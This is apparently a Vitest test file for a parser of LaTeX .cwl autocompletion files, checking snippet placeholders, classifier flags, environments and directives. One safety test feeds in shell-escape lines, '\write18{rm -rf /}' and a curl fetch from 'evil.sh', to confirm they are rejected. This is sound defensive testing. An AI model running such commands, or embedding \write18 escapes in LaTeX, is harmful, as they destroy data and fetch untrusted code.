import { describe, expect, it } from 'vitest';
import { parseCwl } from './cwlParser';

/** Find a command by name, failing loudly when absent. */
function cmd(pkg: ReturnType<typeof parseCwl>, name: string) {
  const found = pkg.commands.find(c => c.name === name);
  if (!found) throw new Error(`command \\${name} not parsed`);
  return found;
}

function env(pkg: ReturnType<typeof parseCwl>, name: string) {
  const found = pkg.environments.find(e => e.name === name);
  if (!found) throw new Error(`environment ${name} not parsed`);
  return found;
}

describe('cwl placeholders', () => {
  it('treats each argument as a numbered placeholder', () => {
    const pkg = parseCwl('\\frac{num}{den}', 't');
    expect(cmd(pkg, 'frac').snippet).toBe('\\frac{${1:num}}{${2:den}}');
    expect(cmd(pkg, 'frac').hasFields).toBe(true);
  });

  it('keeps optional and mandatory brackets distinct', () => {
    const pkg = parseCwl('\\parbox[position]{width}{text}', 't');
    expect(cmd(pkg, 'parbox').snippet).toBe('\\parbox[${1:position}]{${2:width}}{${3:text}}');
  });

  it('handles argument names containing spaces', () => {
    // The legacy `$1default` format could not express these, which is why cwl
    // emits CM6 syntax directly.
    const pkg = parseCwl('\\section[short title]{title}', 't');
    expect(cmd(pkg, 'section').snippet).toBe('\\section[${1:short title}]{${2:title}}');
  });

  it('turns %| into a bare cursor stop', () => {
    const pkg = parseCwl('\\left(%|\\right)#m', 't');
    expect(cmd(pkg, 'left').snippet).toBe('\\left(${1}\\right)');
  });

  it('honours %<...%> partial placeholders', () => {
    const pkg = parseCwl('\\includegraphics[scale=%<1%>]{file}', 't');
    expect(cmd(pkg, 'includegraphics').snippet)
      .toBe('\\includegraphics[scale=${1:1}]{${2:file}}');
  });

  it('discards %:translatable hints but keeps the name', () => {
    // Real form from latex-document.cwl.
    const pkg = parseCwl('\\frac{%<num%:translatable%>}{%<den%:translatable%>}#m', 't');
    expect(cmd(pkg, 'frac').snippet).toBe('\\frac{${1:num}}{${2:den}}');
  });

  it('expands %\\ into a newline', () => {
    const pkg = parseCwl('\\foo{a%\\b}', 't');
    expect(cmd(pkg, 'foo').snippet).toContain('\n');
  });

  it('records commands with no arguments as fieldless', () => {
    const pkg = parseCwl('\\maketitle', 't');
    expect(cmd(pkg, 'maketitle').snippet).toBe('\\maketitle');
    expect(cmd(pkg, 'maketitle').hasFields).toBe(false);
  });

  it('parses single-punctuation command names', () => {
    const pkg = parseCwl('\\,\n\\;\n\\|', 't');
    expect(pkg.commands.map(c => c.name).sort()).toEqual([',', ';', '|']);
  });

  it('escapes braces inside placeholder names so CM6 cannot misread them', () => {
    const pkg = parseCwl('\\foo{a}b}', 't');
    // Trailing unmatched `}` stays literal; the field text itself is escaped.
    expect(cmd(pkg, 'foo').snippet).not.toContain('${1:a}b}');
  });
});

describe('cwl classifiers', () => {
  it('reads #m as math-only and #n as text-only', () => {
    const pkg = parseCwl('\\sqrt{arg}#m\n\\textbf{text}#n', 't');
    expect(cmd(pkg, 'sqrt').mathOnly).toBe(true);
    expect(cmd(pkg, 'sqrt').textOnly).toBe(false);
    expect(cmd(pkg, 'textbf').textOnly).toBe(true);
  });

  it('reads #t as tabular-only', () => {
    const pkg = parseCwl('\\multicolumn{n}{cols}{text}#t', 't');
    expect(cmd(pkg, 'multicolumn').tabularOnly).toBe(true);
  });

  it('marks #* as unusual rather than dropping it', () => {
    const pkg = parseCwl('\\AmSfont#*', 't');
    expect(cmd(pkg, 'AmSfont').unusual).toBe(true);
  });

  it('drops #S entirely', () => {
    const pkg = parseCwl('\\internalThing#S\n\\keepMe', 't');
    expect(pkg.commands.map(c => c.name)).toEqual(['keepMe']);
  });

  it('parses combined classifiers like #*m and #Sm', () => {
    // #*m and #Sm are the two most common combinations in the real corpus.
    const pkg = parseCwl('\\And#*m\n\\hidden#Sm', 't');
    expect(cmd(pkg, 'And').unusual).toBe(true);
    expect(cmd(pkg, 'And').mathOnly).toBe(true);
    expect(pkg.commands.find(c => c.name === 'hidden')).toBeUndefined();
  });

  it('parses /env restrictions', () => {
    const pkg = parseCwl('\\State#/algorithmic', 't');
    expect(cmd(pkg, 'State').envs).toEqual(['algorithmic']);
  });

  it('does not mistake an escaped \\# for the classifier separator', () => {
    const pkg = parseCwl('\\#', 't');
    expect(cmd(pkg, '#').snippet).toBe('\\#');
  });

  it('does not read env or alias names as classifier letters', () => {
    // The flags must be read from the letter section only. Testing the raw
    // classifier for `S` would hide every command restricted to an environment
    // whose name starts with a capital S, and testing it for `m`/`n`/`t` would
    // misread almost any env name.
    const pkg = parseCwl([
      '\\sidebarCmd#/Sidebar',      // capital S in an env name
      '\\tabCmd#/Table',            // capital T, and a `t` inside "Table"
      '\\mathish#\\MyMathAlias',    // `m` letters inside an alias name
    ].join('\n'), 't');

    const sidebar = cmd(pkg, 'sidebarCmd');
    expect(sidebar.envs).toEqual(['Sidebar']);

    const tab = cmd(pkg, 'tabCmd');
    expect(tab.envs).toEqual(['Table']);
    expect(tab.tabularOnly).toBe(false);

    expect(cmd(pkg, 'mathish').mathOnly).toBe(false);
  });

  it('reads #* when it is the only classifier and when combined', () => {
    const pkg = parseCwl('\\lone#*\n\\combined#*m\n\\plain#m', 't');
    expect(cmd(pkg, 'lone').unusual).toBe(true);
    expect(cmd(pkg, 'combined').unusual).toBe(true);
    expect(cmd(pkg, 'combined').mathOnly).toBe(true);
    expect(cmd(pkg, 'plain').unusual).toBe(false);
  });
});

describe('cwl environments', () => {
  it('expands \\begin into a begin/end pair with a body stop', () => {
    const pkg = parseCwl('\\begin{center}', 't');
    expect(env(pkg, 'center').snippet).toBe('\\begin{center}\n\t${1}\n\\end{center}');
  });

  it('keeps environment arguments as placeholders', () => {
    const pkg = parseCwl('\\begin{array}[pos]{cols}#m', 't');
    const e = env(pkg, 'array');
    expect(e.snippet).toBe('\\begin{array}[${1:pos}]{${2:cols}}\n\t${3}\n\\end{array}');
    expect(e.mathOnly).toBe(true);
  });

  it('adds \\item for list environments flagged that way upstream', () => {
    // `\begin{enumerate}\item` is real latex-document.cwl syntax the manual
    // does not document.
    const pkg = parseCwl('\\begin{enumerate}\\item', 't');
    expect(env(pkg, 'enumerate').snippet)
      .toBe('\\begin{enumerate}\n\t\\item ${1}\n\\end{enumerate}');
  });

  it('treats #\\math aliases as math mode', () => {
    const pkg = parseCwl('\\begin{displaymath}#\\math', 't');
    const e = env(pkg, 'displaymath');
    expect(e.aliases).toEqual(['math']);
    expect(e.mathOnly).toBe(true);
  });

  it('records aliases from combined classifiers like #m\\array', () => {
    const pkg = parseCwl('\\begin{aligned}#m\\array', 't');
    expect(env(pkg, 'aligned').aliases).toEqual(['array']);
    expect(env(pkg, 'aligned').mathOnly).toBe(true);
  });
});

describe('cwl directives', () => {
  it('collects #include: dependencies', () => {
    const pkg = parseCwl('#include:amstext\n#include:amsbsy\n\\foo', 't');
    expect(pkg.deps).toEqual(['amstext', 'amsbsy']);
  });

  it('skips #keyvals: blocks so key names are not read as commands', () => {
    const text = [
      '#keyvals:\\usepackage/amsmath#c',
      'intlimits',
      'leqno',
      '#endkeyvals',
      '\\real',
    ].join('\n');
    const pkg = parseCwl(text, 't');
    expect(pkg.commands.map(c => c.name)).toEqual(['real']);
  });

  it('ignores comments and blank lines without counting them as drops', () => {
    const pkg = parseCwl('# mode: amsmath.sty\n# dani/2006\n\n\\foo', 't');
    expect(pkg.droppedLines).toBe(0);
    expect(pkg.commands).toHaveLength(1);
  });

  it('still offers commands inside #ifOption blocks', () => {
    const pkg = parseCwl('#ifOption:svgnames\n\\foo\n#endif', 't');
    expect(pkg.commands.map(c => c.name)).toEqual(['foo']);
  });
});

describe('cwl safety and robustness', () => {
  it('rejects shell-escape constructs', () => {
    const text = [
      '\\write18{rm -rf /}',
      '\\immediate\\write18{curl evil.sh}',
      '\\openout1=x',
      '\\safe{arg}',
    ].join('\n');
    const pkg = parseCwl(text, 't');
    expect(pkg.commands.map(c => c.name)).toEqual(['safe']);
  });

  it('drops malformed lines instead of throwing', () => {
    const text = [
      '\\unbalanced{arg',
      'not-a-command',
      '\\',
      '\\good{arg}',
    ].join('\n');
    const pkg = parseCwl(text, 't');
    expect(pkg.commands.map(c => c.name)).toEqual(['good']);
    expect(pkg.droppedLines).toBeGreaterThan(0);
  });

  it('survives an empty file', () => {
    const pkg = parseCwl('', 'empty');
    expect(pkg.commands).toEqual([]);
    expect(pkg.environments).toEqual([]);
    expect(pkg.deps).toEqual([]);
  });

  it('handles CRLF line endings', () => {
    const pkg = parseCwl('\\foo{a}\r\n\\bar{b}\r\n', 't');
    expect(pkg.commands.map(c => c.name)).toEqual(['foo', 'bar']);
  });
});
